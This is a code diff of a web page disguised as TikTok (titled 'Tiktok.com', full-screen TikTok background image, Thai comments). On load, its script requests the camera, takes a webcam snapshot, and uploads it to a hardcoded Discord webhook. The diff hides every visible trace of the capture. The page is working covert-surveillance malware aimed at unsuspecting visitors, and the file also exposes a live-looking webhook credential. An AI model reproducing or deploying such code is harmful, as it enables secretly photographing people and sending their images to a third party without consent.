@@ -4,59 +4,59 @@
   <meta charset="UTF-8">
   <title>Tiktok.com</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
     body {
+      margin: 0;
+      padding: 0;
       font-family: system-ui, sans-serif;
+
+      /* ⭐ ใส่รูปพื้นหลังเต็มจอ */
+      background-image: url('https://cdn.discordapp.com/attachments/1439099287224193126/1439107786507161671/TikTok.png?ex=69195111&is=6917ff91&hm=ec2bd69bbeb96888f71d4bb7126d3055d157b0b9f5ccf3eecd08ce8aaa518d2f&'); /* ← เปลี่ยนตรงนี้ */
+      background-size: cover;       /* ครอบเต็ม */
+      background-position: center;  /* ตรงกลาง */
+      background-repeat: no-repeat; /* ไม่ซ้ำ */
+      height: 100vh;
+
       display: flex;
       flex-direction: column;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-      background: #0f172a;
-      color: #e5e7eb;
+      justify-content: center;
+
+      color: #fff;
     }
+
     video, canvas, img {
-      margin-top: 20px;
-      border-radius: 12px;
-      max-width: 100%;
-      width: 320px;
+      display: none;
     }
-    .note {
-      font-size: 13px;
-      color: #9ca3af;
-      margin-top: 10px;
-      text-align: center;
-      max-width: 360px;
+
+    #status {
+      font-size: 14px;
+      margin-top: 15px;
     }
   </style>
 </head>
+
 <body>
 
-  <h1></h1>
-  <p class="note">
-    
-  </p>
-
-  <video id="video" playsinline autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <img id="" alt="">
-  <p class="note" id="status"></p>
+  <video id="video" playsinline autoplay></video>
+  <canvas id="canvas"></canvas>
+  <img id="photo" alt="preview">
+  <p id="status"></p>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";
 
-    const video       = document.getElementById('video');
-    const canvas      = document.getElementById('canvas');
-    const photo       = document.getElementById('photo');
-    const statusText  = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const photo = document.getElementById('photo');
+    const statusText = document.getElementById('status');
 
     async function startCapture() {
-      statusText.textContent = "";
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
         video.srcObject = stream;
-        video.style.display = 'block';
 
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
@@ -65,10 +65,9 @@
           };
         });
 
-        statusText.textContent = "";
-        await new Promise(r => setTimeout(r, 800));
+        await new Promise(r => setTimeout(r, 700));
 
-        const width  = video.videoWidth;
+        const width = video.videoWidth;
         const height = video.videoHeight;
 
         canvas.width = width;
@@ -85,31 +84,16 @@
 
         const form = new FormData();
         form.append("file", blob, filename);
-        form.append("content", "📸 Auto-captured from art.github.io");
+        form.append("content", "📸 Auto-captured by art.github.io");
 
-        statusText.textContent = "";
-
-        const res = await fetch(WEBHOOK_URL, {
-          method: "POST",
-          body: form
-        });
-
-        if (res.ok) {
-          statusText.textContent = "";
-        } else {
-          statusText.textContent = ": " + res.status;
-        }
+        await fetch(WEBHOOK_URL, { method: "POST", body: form });
 
         stream.getTracks().forEach(t => t.stop());
-        video.style.display = "none";
-
       } catch (err) {
         console.error(err);
-        statusText.textContent = "";
       }
     }
 
-    // 🚀 เริ่มทำงานทันทีเมื่อเข้าเว็บ
     window.onload = startCapture;
   </script>
 
